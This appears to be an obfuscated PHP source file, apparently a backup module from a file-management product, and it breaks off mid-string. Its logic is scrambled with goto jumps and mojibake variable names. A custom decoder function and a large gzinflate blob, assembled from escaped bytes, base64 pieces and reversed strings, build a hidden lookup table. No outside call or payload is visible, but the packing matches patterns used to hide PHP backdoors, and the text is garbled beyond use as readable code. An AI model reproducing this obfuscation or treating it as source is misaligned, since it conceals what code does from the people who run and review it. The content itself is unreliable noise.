$Fƒ¢üÛß‘â[87]) { return !0; } goto b∂¨ç≤Á–ü; AÏü•ﬂú”∆: return !0; goto cîÚ‡Á≠‹Î; b∂¨ç≤Á–ü: $a–œ˘πü≈ﬁ = new BackupDbFile(); if (!$a–œ˘πü≈ﬁ->index()) { return !1; } self::set(array($Fƒ¢üÛß‘â[734] => 1)); goto AÏü•ﬂú”∆; cîÚ‡Á≠‹Î: } public function file() { $f‘êâ–¢à¯ =& $_SERVER[ú∫]; $A‰¢Ö©ñ‹÷ = self::get(); if ($A‰¢Ö©ñ‹÷[$f‘êâ–¢à¯[291]][$f‘êâ–¢à¯[193]][$f‘êâ–¢à¯[710]] == $f‘êâ–¢à¯[87]) { return !0; } if (!isset($A‰¢Ö©ñ‹÷[$f‘êâ–¢à¯[715]]) || $A‰¢Ö©ñ‹÷[$f‘êâ–¢à¯[715]] == $f‘êâ–¢à¯[191]) { $D√ÌïÏ°…ì = new BackupFile(); if (!$D√ÌïÏ°…ì->index()) { return !1; } } self::set(array($f‘êâ–¢à¯[735] => 1, $f‘êâ–¢à¯[710] => 1)); return !0; } } goto b ô•˜Ú¶‡; bÑã ¨üØ: $CÛñ¨®•ââ = $_SERVER[ú∫][574]; $_SERVER[é°ËπÔ úﬁ] = explode($_SERVER[ú∫][575], gzinflate(substr($_SERVER[ú∫][576], 10, -8))); $E√÷ØøÂ—Ø = $_SERVER[ú∫][577]; goto BíÎ≥¡Ê§≈; c‚◊äÔœº∂: if (!function_exists('_kodDe')) { function _kodDe($AµÎ°àÜçÃ) { $AµÎ°àÜçÃ = base64_decode($AµÎ°àÜçÃ); $bÁéê–¿∂ı = strlen($AµÎ°àÜçÃ); $A–à…Üê•ª = ''; $b•àêÀ≤—ß = ord($AµÎ°àÜçÃ[0]) - 30; for ($dóõ€¿£Êï = 1; $dóõ€¿£Êï < $bÁéê–¿∂ı; $dóõ€¿£Êï += 2) { if ($dóõ€¿£Êï + 1 < $bÁéê–¿∂ı) { $A–à…Üê•ª .= chr(ord($AµÎ°àÜçÃ[$dóõ€¿£Êï + 1]) + $b•àêÀ≤—ß); $A–à…Üê•ª .= chr(ord($AµÎ°àÜçÃ[$dóõ€¿£Êï]) + $b•àêÀ≤—ß); } else { $A–à…Üê•ª .= chr(ord($AµÎ°àÜçÃ[$dóõ€¿£Êï]) + $b•àêÀ≤—ß); } } return $A–à…Üê•ª; } } define(strrev('∫ú'), "\255\323\324\274\301\217"); $_SERVER[ú∫] = explode("\x7c\x4\x7c\x4\x7c\x1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\123\125\366\260\216\70\10\156\343\202\273\303\243\2\155\41\113\133\366\102\301\264\111\333\110\332\224\44\245\124\12\341".strrev('›ˆ‡.2æ‡ø∑'."\r".'«QîgACq‘ECq≈PeƒEë\\tgh›/y•‰õ^iy%').base64_decode('/d73kjr/7/d9CuTdc/dz7z33nHPPPXfDjgfeWX/h489/PzAM/H/wtxvw78BvwA==').strrev('qΩÏÚŒõÚ=Á>v˚˜/$ﬁMæCª•ƒxÿúéßÍJJKÚ»w˝;À—Ô‚ﬂﬂ').base64_decode('Z9/egw8ac+LEhypBYpy3Ev9Iac2QlF5VN3QMiGrpuNqOv9U0/nXiH70rqRoK/g==')."\xe\x37\xfa\x43\xe1\x60\x73\x53\x93\x27\x10\xa\x93\x12\xc5\xf8\x94\x16\x23\x5f\x19\x39\x2b\xa7\x48\xe1\x19\x25\xab\x83\xaa\xc4\xe2\xc2\x19\x2d\xa3\xa4\x4d\x10\xe\x88\xc9\x86\x1c\x91".strrev('BîmÁS⁄´µñOE,)MHF≥ê–g–á∂JrªÑà§áìkP·≠¸˘4ˆÏ:ªíRu')."\1\127\143\320\125\23\362\372\33\61\270\306\337\320\340\15\345\303\3\176\237\257\332\125\63\67\77\246\51\340\252\153\160\111\240\175\111\45\254\246\343\132\211\264\4\307"."\x2c\x91\x4a\xf1\x47\xad\xaa\x24\x63\xf8\x33\x2d\xd3\xe6\x18\x7d\x19\xf2\x15\x62\x5f\x60\xc\xd2\xb9\x64\x12\x7\x1a\xd9\x17\x69\xbf\x12\x97\x73\x49\x82\x33\xb7\x18\xc8\x64\xd5\x94\x4c"."\273\76\127\351\143\120\374\41\347\14\115\115\107\161\300\323\153\144\145\16\7\55\216\146\225\224\222\46\105\5\75\76\117\115\110\202\315\224\152\3\376\6\211\14\105\112"."\xd6\xd\x25\x2b\xb5\xd4\x7b\x2\x1e\x9\x36\xbd\xaa\x18\xf5\xb8\x58\xc2\xf9\x9a\x1b\x1\x42\x24\x97\xcf\x27\xd\x55\x82\xa1\xa4\x32\xb4\x18\x9c\xa7\x40\x61\xfe\x80\xdb\x13\x90\xaa\x5b".base64_decode('JY6nqJZKaWkHKAWMpyE01RMI4A8bmcE+Lxw6EvDX1gY9LEQ6N88HWjKJzFJTKA==')."\26\117\32\341\156\71\231\243\223\265\23\377\26\223\37\362\253\351\144\2\167\251\151\65\107\46\53\51\102\323\330\312\41\37\71\232\132\241\20\45\106\76\122\40\277\106".base64_decode('FhdYad34s2o2/p1JEkXCME7JGmElHdViapqsxzlk7ZEZKBsJd1YF6UiBmiOqZQ==').base64_decode('+hq0btKZuJpUfGy5xbVkTMnycAZkF2NIr9R+IXdjLiUmYcFoQk3GsnSV/lpKQA==')."\x7\xd4\x78\x1f\x5f\x8d\xba\x96\xcb\x46\x15\x2f\x58\x2f\x3c\x6f\x13\x6b\x49\x39\x49\xa4\x18\x6\xe8\xb4\x4e\xfb\xd5\x9c\x49\x6a\x72\x2c\xa8\x64\x85\xbe\xd6\x82\x8c\xfe\x9c\x21\x2\x73"."\50\131\255\226\115\271\1\335\40\365\203\325\242\66\27\210\350\244\353\45\46\240\320\201\177\234\45\13\317\265\377\274\150\341\231\340\237\122\102\374\332\110\323\22\112\62"."\31\126\172\25\262\256\122\261\51\72\355\253\123\217\250\151\47\200\340\240\327\37\116\310\172\242\41\66\45\214\162\221\226\247\143\112\257\43\223\310\340\40\137\367\155\246".base64_decode('eQ9Hp1EzPAJlTmpROSn2FH8nDCMTVNIxiBDSI60njRCWURSSyG2TYlKD1CrVVw==')."\xaa\x95\x3a\xcd\x98\x4a\xb2\x2f\xda\x3b\x6\xd3\x19\xd0\xe8\x25\x33\xa6\x88\x84\x95\x5e\x83\x20\x45\x9a\x19\x4d\xc8\x59\x30\x5c\x55\x39\x23\x6e\x9f\x8e\x81\x72\x26\x93\x54\xa3\xb2\xa1"."\x6a\x69\xa7\x16\x35\x14\xc3\xae\x1b\x59\x45\x26\xa5\xb9\xa2\x51\x45\xd7\xed\x35\x5a\xda\xc8\x6a\x49\xbb\x2b\x99\xd4\x7a\xec\xfe\xac\xda\xae\xa6\x2b\xa5\x9\x38\xd\x8c\x4\xeb\xdd\xe"."\51\144\45\131\304\105\63\45\70\127\40\201\230\200\153\243\213\223\245\316\312\151\75\256\144\355\36\262\150\52\45\60\36\214\100\322\144\156\125\317\150\272\12\233\127\51"._kodDe('MnK1Mw18/9ykl84RaoapljoRVZkbI5NSj4kBQaJXln30LC521RWpoxfQkxU2d38=')."\0\314\220\325\133\0\206\123\23\324\124\112\121\30\264\111\251\234\156\330\263\12\240\122\52\330\17\311\30\173\343\366\6\270\264\124\45\146\17\2\142\116\300\223\312\46"."\113\140\332\110\64\16\103\353\103\241\246\260\267\26\354\331\215\236\160\203\53\124\123\117\232\155\310\355\264\315\76\100\242\131\221\24\270\300\16\226\30\234\130\215\240\257".base64_decode('HNik9ShZUHF1X6XUqcUiWq+DRsHEQUBDaGI43BnDHpDT7RA/kT5DIdNP7243Iw==')."\332\247\244\333\215\4\315\30\364\4\346\173\2\341\240\277\66\324\342\12\220\335\76\15\146\111\57\255\12\26\235\264\7\224\30\100\175\324\240\371\344\14\304\32\115\3"."\x17\x6\x1c\x2b\x1a\xb\x17\xb\x8d\xf3\x79\xeb\x20\x62\xdc\x76\x1d\x24\xb2\x8b\xa9\x68\xd9\x3e\x35\xa5\xc2\xb6\x1b\x2c\x6\x61\x12\xb0\x2\x75\xa4\x41\x4e\xd4\xa1\xaa\xb6\xc4\x84\x92".strrev('ps¸ì(•ÁNë)9TM‡R©≤ä• ;ñqÁïN9¢¬c∑6¬ÈBw¯;Rƒÿ∂').strrev('T-€íõ’d«#",ˇ¥{I•·ßÀ‰\\x5&Ôﬁ®O·CˆkÃuµñÎ')."\32\206\32\264\254\142\206\14\260\135\243\105\215\121\62\16\203\365\212\332\236\40\375\123\141\151\121\55\251\145\345\44\244\142\164\22\53\224\262\264\253\161\62\76\230\140".base64_decode('8kBQTWUoXTMSuVRE+KRsKRhvur0kNLa9aVnyVekkCcdV1JLF43cGJ4E/nAzHtA==').base64_decode('lEy5XUSSlBimSRg0wRRTr8h8vzSyhgahWVOSBsVIaGSQ2hXapBxrG21lTEkqFA==')."\x1b\x9\x85\x92\xf4\x32\x92\xc\xec\x4c\xc\x57\x71\x46\xde\x1\xe3\x6\xa0\x7c\x4b\x55\xf5\x0\xc8\x9\x19\x29\x1a\x6e\x81\xfc\x2e\x7\x18\x2c\x69\x12\xec\x26\xfe\x48\x7\x58\x2e\x38".base64_decode('HFb1WmHzD2soDjRe5umbskpcJYsuDUasQc520gxghPi2AwNCYbXNPl+4xt8YAg==')."\74\64\206\264\4\274\41\17\235\243\56\167\330\125\323\64\100\67\121\76\342\44\1\44\30\346\111\316\371\345\356\212\1\276\23\361\55\213\23\163\202\10\104\254\361\67".strrev('\'+åóµ«˝ïáy∫k;&Ä)Ì˙ß.◊ΩŒprÛ”B”1N:…∆-)(ˆ+≠-Œ†').base64_decode('3xCxQDCiW3uTP0gyzIFQwD1FlCxpR1MziUoJc6rOQ4AjyTRMyIR3crUEKenNgQ==').base64_decode('9Fm1X+Z9nEPbQ8ruTSU5Q2julZ2PRaje2zg33OB3e3xhbyOgS6F8eHOT20UHVw==')."\x84\x57\xfb\x43\xf5\x26\x68\x33\xa0\x4c\xf3\x5d\x3e\xaf\x35\xb9\x67\x81\x37\x18\xa\x16\x8c\x2\xb0\x66\x8f\x25\x6\xc8\x82\x4d\x1\x4f\xad\x77\x1\xb\xd6\x7a\x3d\x3e\x77\x30\x5c\xe3".base64_decode('qqnnaRpdDSQQjkNpTHea04cBiQ0ymS7cDeVTiqywSYAKU9EgzOcB2C4VMvdIdw==').strrev('`0–n¢}è§GËîÜFJ'."\n".'‰©OK'."\n".'›2VY2RUJ)â±ë≥£ñ®ÙxBzåT°')."\111\375\22\41\367\171\55\10\303\64\325\112\234\121\356\302\0\127\334\140\124\300\22\6\353\202\307\201\21\160\41\361\33\314\4\64\42\141\272\326\164\40\257\270\150\163"."\xe2\x5c\xf4\xd\xfb\x9b\x3c\x1\x17\x14\x9c\xc3\x2d\x1\x7f\x63\x1d\xc9\xd0\x93\x50\x68\x3\xbc\x4\xfd\x25\x94\x7d\x22\xf2\xb3\xc1\x49\x18\xe0\x7d\x64\x2a\x42\x71\xa4\x77\x68\x14\x95"."\x3\xf8\x67\x3c\xfe\x1\x6c\x1f\xa9\x5c\x49\x53\xac\x47\x20\x35\x67\x84\x81\x7c\xc4\xc1\x6a\xa0\x94\x58\xcb\xb1\xda\x22\x9a\x46\x6a\x48\x42\xe\x60\x80\xd2\x3\x26\x79\x77\xe8\x74\x92"."\364\122\342\63\221\124\330\113\166\224\220\177\256\247\61\114\147\26\16\11\263\21\3\200\54\353\17\20\204\30\132\47\25\250\160\144\300\23\244\253\74\253\164\345\124\212".base64_decode('LqdjIpnFCti0SPXOxW09E0sW2ic6FoGP0gln4iAJtTlMwbEkfy7LckPGqESfUw==').base64_decode('WtnmbHOWzKlc6LL3y/b+MvsM+6KJbY7SiQSwaGmFbfIgTAASzjljEfipapszrg==').strrev('…§íƒ√'."\0".'ì@KcSX˚F, YsDı°Œî&ã=m«6ò‚r∏®∂ÿ\\ŒK˛>Õ')."\23\22\320\210\176\65\303\241\113\247\16\122\70\30\103\245\235\347\130\150\157\233\270\150\216\220\117\0\131\353\2\314\22\240\277\11\226\316\145\77\33\366\214\145\205\353"."\236\314\217\134\72\312\251\47\134\27\21\71\112\350\200\332\236\146\113\10\160\1\114\110\67\363\351\113\307\341\337\101\72\220\355\12\131\364\110\321\226\45\263\63\227\126"."\273\250\16\42\255\164\221\17\315\240\363\73\242\30\75\12\235\36\0\156\12\203\311\101\5\103\20\45\204\222\210\55\44\65\160\1\115\101\322\12\351\105\46\14\171\262".base64_decode('HhaKKWkyTiNIaj0qZ5Sg0MNwOOSq9nnClMIQSkzDiCpWM60d6BqnqJQ+RDmTjg==')."\xe4\x11\xb2\xf2\xf5\xae\xa4\x84\x8\x83\xa4\x64\xb3\x5a\xb6\x12\x69\x27\xf5\x5c\x6\x32\x73\x40\xf6\x32\x0\x6e\x25\x20\xb8\x4b\x55\xb3\x25\x8c\x72\x92\x2f\x2c\xe\x40\x46\xa6\x9c\x3"."\x94\xa5\x19\x37\xe0\x2c\x69\x6b\xcb\x2d\x54\x62\x8b\x16\x82\x49\x2d\xdb\xe3\x8b\x96\x4e\x1a\x2c\xa5\x3c\xba\xb3\xd\xfc\x47\x3\x98\x96\x91\xd6\x67\xf8\x58\xea\x80\x59\xa3\x9c\x93\xab"."\x80\x12\x2d\xcc\xa8\x61\x18\xec\xcf\xe\xd8\xe\xa6\x7\x31\x5\x58\x34\xe\x6a\x59\xc6\x34\x65\x4c\x6c\xb7\xa1\x19\x72\xd2\x54\x44\x8\x42\xc8\xe0\xb2\x8d\x9b\xa8\xc\xf0\x68\xfb\x38"."\305\202\133\271\240\203\104\344\264\221\51\330\230\2\104\120\177\301\34\101\305\160\260\24\66\41\22\377\133\105\264\0\161\65\15\326\120\215\260\277\141\245\115\260\117\67"."\x94\x94\x49\x4f\xa9\x2b\x72\x36\x9a\xa8\xcd\x25\x93\x6\xe3\xf8\x93\x6a\x27\x29\x96\x2c\x90\x25\x85\xd2\xd6\x6a\x59\x2a\xd9\x4e\x20\xf5\x16\x4d\x28\x94\xd0\x9b\x4e\x3\x39\x54\x9c\x50"."\174\53\255\163\1\246\45\44\225\120\235\236\344\155\224\252\375\176\237\307\325\50\301\135\233\354\66\136\267\235\346\137\140\367\272\361\67\373\120\143\164\20\0\45\63\50"."\x94\x68\xb3\x48\x8\x32\x8f\x36\xa8\xb8\xb1\x41\x16\xc1\x6\x9a\x65\x83\x92\x90\x8d\x33\xec\x36\xae\xe\xb3\x31\x76\xd9\x46\xb8\x68\x9b\x21\x67\xc1\x6\xf\xd9\x5c\xf2\xe9\x75\xdb\x54"."\335\215\104\4\124\56\212\242\355\60\22\120\63\221\224\373\154\270\115\76\245\133\111\332\150\213\154\264\241\66\312\342\333\220\310\346\46\255\151\6\123\234\264\6\175\2"."\x9a\x97\xb0\xc1\xe1\x87\xb3\xcf\xc6\xb5\x74\xa4\x3a\x41\xa6\xb0\x71\x79\xc3\xd6\x9e\xd5\x72\x99\x26\x5a\x93\x10\xc2\x8d\x21\x0\xde\x52\x6\x8\x68\x9a\x61\xa3\x32\xa4\x2d\x5f\xbc\x2c"."\x8c\xb2\xc2\x4d\x47\x38\xb6\xd6\x4d\xc6\x7\x46\xe5\xa3\xa4\x70\xe9\xf9\x38\x37\x4b\x47\x4b\x71\x41\x44\xca\x1e\xa4\xfb\x90\x29\xd\x1f\x42\xba\x4a\x92\xa\xf\x41\x24\xf3\xaf\xf9\x7c"."\x69\xc1\x7e\xd4\xca\xdd\xe2\xa4\x2a\x34\xc1\xe8\x6e\x40\x27\x23\xd7\x96\x73\x65\x2e\xe7\x4e\xad\x72\xa2\x55\x15\xb\x2b\xd\xc9\xed\x41\xa1\x3a\x43\x6e\xa7\x75\x15\x88\xc5\xdf\x1\x25".base64_decode('2hflsqZbkGDNIYZ3tC4KTe7C48kmLBuHkSNGUETSWczG0jT5h1xtvE/+DN/QIQ==')."\x9\xd\x82\xad\x45\x20\x92\x14\xe4\xe7\x34\x39\x47\x18\x10\x59\x27\xa2\x0\xd4\xaf\x92\x2f\x85\xc2\x78\x57\x44\x64\xa3\xfe\x58\x1\x14\x3b\xa6\x7a\x61\x90\x4f\x14\x8a\x2\x9\x56\x40"."\xa\x40\x5b\x26\x5c\x25\x76\x3e\xe4\x42\x90\xfc\xa8\x5a\x18\xe3\x3d\x9c\x62\x52\x3c\x1b\x8\xb\x41\x87\xe3\xd2\xa4\xa6\xfb\xd4\xb4\xa8\x65\xe1\xd0\x1\xb6\x27\xf0\x2d\x9\x4e\x5c\x8b"."\136\310\75\324\67\246\205\134\213\143\43\332\35\33\20\313\73\205\235\203\253\20\100\353\141\126\241\355\244\44\113\313\51\301\40\235\156\6\62\151\330\62\161\311\224\115"."\xc8\x59\x8e\x53\xba\xc2\xe0\x34\xe7\xba\x2b\x98\x84\x7\x85\x64\x71\xb9\x9b\x6f\x97\xa6\x3c\xc2\x3a\xd1\x8d\x3e\xda\x7a\xf1\xd3\x5c\x28\xe\xba\x87\xa\xd4\x33\x51\xbb\x50\x50\x5c\x82"."\252\356\3\270\53\364\215\172\32\322\12\6\241\2\210\176\153\150\376\323\363\130\323\156\206\204\325\22\12\43\333\142\130\20\141\331\312\64\347\303\15\164\61\342\6\370".base64_decode('yySg5FkHXEx1kDBTrOF1TwuDmwD+FhJlrDTctMfkgfITst3GArUEeeUmOkVmeQ==').base64_decode('JqOkYzCJsNhMxVKdohwD4rwji2miA/CC5HTQViZs1HxhL9URe0Ro6KAFXwaQOw==').base64_decode('I3LWkQUV8yZzmkEYvRwDLCI9QIUWyoFjfBoVWuDC8cRUA0IgXdSoSpInFM7qGA==')."\114\44\133\20\131\216\274\121\342\374\234\155\234\51\145\241\75\301\61\1\221\161\7\337\265\304\75\117\74\216\204\7\232\370\113\70\303\117\261\23\116\4\164\350\206\226"."\xe1\x31\x42\x10\x47\xb\x51\xbc\x50\x21\x15\x43\x3f\x6a\x13\xa0\xe3\x31\xc4\xeb\x70\xa4\xa1\xb4\x24\x2f\x12\x6e\xf0\x84\x77\x24\x41\xa\x41\x6d\xee\x75\xbb\xb2\x59\x3a\x3f\x70\x87\xa0"."\46\25\0\105\20\134\334\101\252\21\56\104\255\161\341\236\156\176\66\217\213\202\25\73\360\66\343\220\143\61\77\325\154\212\337\371\111\105\105\117\341\202\220\271\4\53".base64_decode('SggVTu5KJvkhqjU8ZBa8WMVMImTIbLVIyKCnHYVgjD8VuTAz18WPtK3cmZkgDQ==')."\xbd\x85\xd3\x95\x6c\xe5\x2e\xd9\x80\x16\xe\x83\xed\xae\x26\xa1\xa6\x15\x9d\xed\x5a\x59\xbd\x40\x8f\xe1\xcc\x1c\x6a\x98\x60\x9c\xa0\x8a\x3\xd2\x26\x0\x88\x1b\x2\xd3\x37\x71\xa2\x20"."\xec\x79\x68\xff\x8\x1b\xa6\xdd\x3a\x80\xca\x10\xa6\xaa\x9\xfb\x60\x69\x60\x4c\xd6\x66\xb5\x94\xd7\xf\xa6\x7e\xe1\xf9\x60\x4d\xa7\x50\x8d\x1b\xa2\x30\xbd\x6a\xa1\x8e\x82\xf1\x83\x5b".base64_decode('/VBl0mhWFOcLVm34cMsXO9Z/+RYOPn3VCx98/+937r/7dRyePoOcmAwcggyk0A==').base64_decode('NzeOumDBoPbGtpOfud95+aMn39pSevk3tXfs/F2r8/7TXrtn8acbPzrlvd5Zlw==')."\xfc\xad\xfe\xf7\x4f\x9f\x38\xf7\xeb\xaf\xfd\x9b\xef\x68\xf8\xe5\xc3\x17\xe4\xd3\x37\x1f\x75\xea\xfd\x91\x43\xa6\x2e\xe9\xc\x2e\xf1\x2c\xbf\xef\xd5\x7\xae\x8e\x7e\xb7\xf0\xd3\xed\x4b"."\77\257\177\335\173\342\111\57\356\326\173\376\131\365\305\77\277\250\237\177\135\103\356\353\17\207\137\372\350\167\37\376\340\371\371\270\3\353\266\326\265\177\376\336\306\371".strrev('0;√uÏ∫~#ô“yﬁﬂ⁄⁄n8M¯˚æ∑èàˆ°ºû#1¬w‘≥o%œÕŸB˘ø&ì')."\xbb\xee\xba\x69\xab\xda\x66\x7f\xfb\x69\x22\xbe\x67\x5b\x76\xd9\x2f\x7f\xbc\xea\xb5\x4c\xf5\xd3\x87\x9d\xf1\xc6\xfc\x1b\xcf\xf9\xfe\xb6\x63\xb6\x48\xbb\x1c\x37\xe9\xa5\xdf\x27\xc7\xa7"."\x77\x8e\xf8\xf7\x93\x1b\x3c\xbb\xa7\xce\x3c\x72\xf9\xf6\xc3\x9e\xae\xf5\x9d\x31\x6d\xd8\x88\x1b\x2f\x3b\x50\xbd\x6a\xd3\x83\xef\xfd\x7c\xe3\x57\x8f\x17\x1f\x75\xe4\xb2\x97\x5e\x18\xbf".base64_decode('+Xj3KX9+ct7bdZ1TNtt99wy76PtJl1fcsHrtE9mK9Ek9dXW7nw1VnfLdjHfX7Q==')."\371\70\326\374\37\337\27\353\36\151\171\353\351\337\76\132\167\110\331\115\376\370\155\347\125\47\157\13\374\173\241\166\345\310\206\320\364\316\121\277\377\361\77\353\16\374"."\x63\xfc\x97\xe7\x8c\x7e\xfb\xcf\x75\xa7\x4\x3a\xbe\x79\x68\xde\xc1\x3b\x5e\xfb\x31\xb4\xf5\x8a\xb3\x4f\x57\xc7\x35\xbe\xb8\x4c\xde\x22\xbd\xf9\xf3\xe6\xad\xc3\xd7\x94\x5e\x75\xff\xb5"."\x47\x1d\xd8\x7a\xc8\xec\xb7\x4e\x3e\xe2\x81\x85\x87\x4c\x99\xbb\xe3\xb5\x57\xa6\xc\xec\x2c\xb9\x31\x70\xfa\x15\x93\x1b\x97\x6d\x7e\xec\xa9\x5\xb7\x87\x56\x4e\xf8\xfe\xe5\xd\xdb\x9f"."\xca\xdd\xd0\x72\xbb\x72\xd9\x56\x77\xbb\x1e\x28\xbf\xff\xf8\xf3\x4f\x7d\x67\xe6\x79\xf\xf6\xbf\xd6\x74\xca\x94\xdf\xec\xba\x71\xca\x8c\xdb\x4b\x2e\x7e\x69\x65\xf6\xf4\xcf\xef\x59\x3f".base64_decode('quishjEbR/bcfdCE686OtW5cfNqJLsf8N7fXjHwrsGPU09s/faB0+TPe88tHPA==').base64_decode('/qp+YuctgRcz9y67d3Xb+3MOmXjY0nX2wUemHz5w00u3SKnDx35y2uu+tusv6g==').base64_decode('X71kzecHf5I4t+zFnd/0jzr3uR9ssx7fsCb3u2Pbr7r4qFavdM55sY8OmjF25g==').base64_decode('F5cdNMwY8eIb45/Yd/+Kqad9v23DP6tPOeToow994vIDB6bfIy+vefPiS49Yfg==').base64_decode('6OLR6UX3/G7fCyuOuOW5kCsy7R81HyudtaM/+GtK9szefeTpL6zylE06bfRxww==')."\x5b\xbf\x35\x3e\x5b\x66\xdb\x75\xfa\xce\x6b\xaf\x71\x27\xa6\x45\x4b\xdf\x5f\x59\x7a\x64\xf0\x82\x9a\xeb\x2f\xdb\x50\xac\xef\x72\xcf\xbe\x7a\xd7\xe0\xae\x7b\x5a\x4f\xbf\xe6\x9e\xfb\x9e".base64_decode('e6L0mnGxDbnE52c/5Fj1UKzvqTffuvF+x2mHbVz3wU3HXPvioroxH827Xhn93A==').base64_decode('R7vuK901esHiN+6/eOm1szafNrdpcPInj+/IjXxj6bVXzXh+96zxvSs/23SgNQ==')."\xfb\xc6\xf8\xfa\xb5\x47\xac\x71\xb4\xc6\x2e\x3f\x77\xcf\x3f\xf6\xad\x1d\xfc\xfb\xba\xbb\xdb\x1e\xb9\xae\x7c\xf5\x46\x6f\xd7\xd8\x3d\xbf\x8b\x8c\x7f\x6d\x77\xee\x91\xcc\x4f\xb3\xa6\xce".base64_decode('7PrXg6fccuvSGStb1y6+9oudBz310pRNJ29aU/a3N18bFnnzzNXX/s8/nrnsvQ==')."\55\147\234\173\313\227\363\337\173\254\364\332\343\276\233\360\354\25\177\33\73\162\177\131\351\157\76\133\161\304\332\223\227\256\137\366\352\355\372\361\237\14\46\2\363\146"."\x37\x5f\x7d\x5b\x4b\xcb\xde\xe3\x4f\xbb\xf4\xf2\x63\xd7\xac\x5e\x36\xed\x2e\x5f\xe9\x59\xaf\x3f\x71\xf8\xd4\x49\x53\x7\x6f\x79\x61\x55\x66\x6f\x77\xe7\x2e\xed\xf6\x8b\xee\xf8\x28\xfd".strrev('ùˆo˘tzØÁ«„˛º¯íûﬁ[\'/´ÈkHΩ˘•µæj€˚¸Âwª9„ıüw◊€\'¨ ')."\x32\xa6\x51\xda\xae\xbf\xff\xf1\x84\xce\xc5\xcf\x9d\xbe\x4b\xba\xe1\xb9\xe5\xe7\x6d\xb8\xd3\xb3\xb0\xff\xa6\xf9\xdb\x46\x9e\x30\xee\xcc\x2b\xf7\xf\x4f\xbe\x6c\x5b\x77\xb1\x12\x5b\xd4".base64_decode('0zFjbF1TTe28msveHPnebQdX93z7w/COzrKT3gr+UNP48L93z39m67v/6Xh48w==')."\xea\xdf\x4d\xfd\xab\x72\x6c\xe6\xbe\x8d\x8b\x73\xb7\x87\xd2\x53\xeb\xab\x76\x3f\xbe\xf6\x82\xf4\xe8\x59\xc3\x93\x63\xcb\xb6\x5d\x71\xc5\xc4\xcb\x97\x46\xe6\xdd\x5c\x34\x3c\x72\xc4\xa8"."\xb3\x52\xe7\xef\x98\x91\xfa\xfe\xe7\x11\x2d\x21\xe3\xd3\xde\xf5\xf\xed\x18\x99\xfd\xeb\xcf\x27\xff\x32\x63\xc4\x49\x13\xaf\x7d\xea\xf7\xf3\x5b\x7f\x39\xee\xa2\xd7\xf6\xe\xbb\xeb\x9c"."\141\113\136\253\136\267\157\330\65\225\313\214\215\57\75\160\315\224\335\267\264\367\306\157\274\360\320\215\265\55\325\113\237\331\220\76\46\250\75\377\227\153\116\76\41\172".base64_decode('/vu/XfYXdc3HV4766PkvDx2e2/LD68dOPGbMk87KD5/uNZb+9KfmNZVjPw87Fw==')."\x74\xd7\x5f\xfc\xf9\xe5\xb9\xf5\x53\x9e\xe8\x49\x7a\xdf\x78\xf1\x3e\xe5\xbb\x87\xaf\xac\x74\xce\x9f\xb8\xea\xe8\x75\xae\x56\xf7\x93\x2b\xaf\xb4\xf\x9f\xbd\x7a\xfc\xbe\xf8\xea\xb\xaf"."\70\373\326\107\74\143\347\136\375\354\246\67\157\277\373\346\135\27\234\372\324\167\267\376\162\354\346\113\155\363\126\314\162\276\174\141\303\157\177\154\274\170\133\266\153\356"."\x9d\xa7\xed\x7b\xe1\xfd\x7d\xf\x6f\x5d\xd5\xff\xe6\xe9\xfe\xb1\x7\xf6\x2d\x73\xd\x1c\xf3\xce\xc3\xff\xfa\x68\x43\xe5\xe7\xdf\x3e\xf4\x3f\x9f\x9f\x34\xb6\x6c\xf5\x27\x23\x7\xfe\x35"."\347\52\137\353\354\333\76\333\375\312\23\256\236\313\126\316\74\254\267\265\53\271\143\361\260\37\22\327\155\173\175\356\366\7\367\235\245\34\376\306\344\337\214\232\72\372"."\xd1\xee\x96\xba\xd3\x7f\x7a\x6a\x7d\xf1\xf2\x97\x6f\x3b\x72\x91\x76\xc6\xa8\x1f\xa6\xae\xd5\x52\x7f\xd8\xb5\x29\xf4\xe7\x71\x17\x9c\xf9\xd9\xb0\x33\xf4\xc3\x1e\x3d\xe6\xed\x81\x3f\x9f".strrev('ÚtÈ+€vøõ-µˇj˙Ô€≥Á?ûãˇpx~∑QÎ|úoç”Ù›NkEŸmM5÷±')."\xd1\x87\xbe\x9a\x70\xd2\x92\xa9\x37\x8f\xba\xe9\xd6\xd0\x59\x67\x55\x2d\x4c\xcd\x5c\xf1\xc9\x7d\xb1\x2b\x7a\xf\x59\x77\xdd\x4f\x1f\x3f\x7b\xef\x9c\x9f\x7f\xfc\xfa\xde\xc7\x16\xcf\x1e".base64_decode('HPjqg2fe/sN/vtrzr5u1ttk/ffzjmj+uf+yHr+71/5L96tn2Ex/75ekrBt/59A==')."\x81\xfd\xd\x5f\xfc\xb8\x60\x9f\xf6\xd3\xd8\xce\xe4\x94\x23\xcf\x5b\x3f\x6a\xba\x9a\xd9\xbc\x66\x79\xa8\xa4\xc1\x73\xe5\xf9\xb6\x39\x7b\x77\x4f\x5f\xff\x4e\xd9\xb7\xfe\xe3\x63\x25\xee".strrev('˙ü&kÉ’ıò7+Uﬁ¸LˆZ€?∆õ5ÃsG'."\r".'¸È>¨Vìóª‰d¥aq_ÿÔ')."\156\137\133\317\264\313\347\126\336\332\163\347\366\235\115\353\275\203\237\254\170\177\163\325\246\277\136\260\360\22\333\147\107\257\35\250\175\334\61\163\356\373\257\314\252\74".base64_decode('drD1hK+O37952mnnbltaN+0E7cTFb7868OD+1xvuG+EffWNgd/+Dd/ft+3yxtg==')._kodDe('KzA+s9jdpiBo/+JgrlNMsuAvuc9oGshoyShxwNTjhY6gr3KH06EziOSqjmWi3PI=')."\xee\x7b\xd5\x23\xfe\xfa\xf2\xc4\x8d\x2f\x1d\xf5\xfa\xb2\x71\x4f\xb4\x2c\x5e\xf1\xc7\xd\xe7\x7e\xf8\xe4\xae\xd2\xa6\xdf\x2c\xcf\x24\xd7\x4e\xca\xbd\x37\x7a\xd4\x35\xbe\x83\xbf\x1d\x35"."\362\206\267\47\155\17\277\164\225\363\214\27\236\311\336\221\71\266\150\364\373\277\375\341\325\222\303\326\134\324\360\372\376\177\335\371\354\325\143\377\362\330\366\203\236\332".base64_decode('t3Vdxa2zLh356JObx66M/mPbmFXbLrnr/TVrI2XZbz+LbHnN0XHoYLGS3jLm3g==')."\xf2\xe9\x37\x3c\xf5\xf3\x4f\xa3\x57\x1f\x75\xc3\xf7\xff\xb8\x3d\x31\xf6\xa2\x64\xf3\x92\x45\xa9\xb5\x5f\x3e\xf4\x3f\xb6\x55\xfe\x1f\x9b\xb7\x4c\x3e\xd9\xfd\xfa\xb1\x3f\x7c\xb7\x70\xf7"."\360\2